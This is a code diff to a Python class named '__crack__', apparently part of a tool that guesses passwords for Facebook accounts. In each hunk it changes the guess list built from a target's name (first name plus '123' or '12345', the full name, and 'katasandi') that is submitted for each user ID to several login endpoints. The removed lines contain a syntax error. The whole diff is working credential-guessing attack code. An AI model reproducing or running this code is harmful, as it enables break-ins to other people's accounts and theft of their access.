@@ -991,9 +991,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         else:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         __yayanXD__.submit(self.__api__, uid, pwx)
                     except:
                         pass
@@ -1011,9 +1011,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         else:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         __yayanXD__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -1031,9 +1031,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         else:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
@@ -1051,9 +1051,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         else:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
@@ -1071,9 +1071,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         else:
-                            pwx = [name, xz[0]+"234"xz[0]+"123", xz[0]+"12345"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "katasandi"]
                         __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
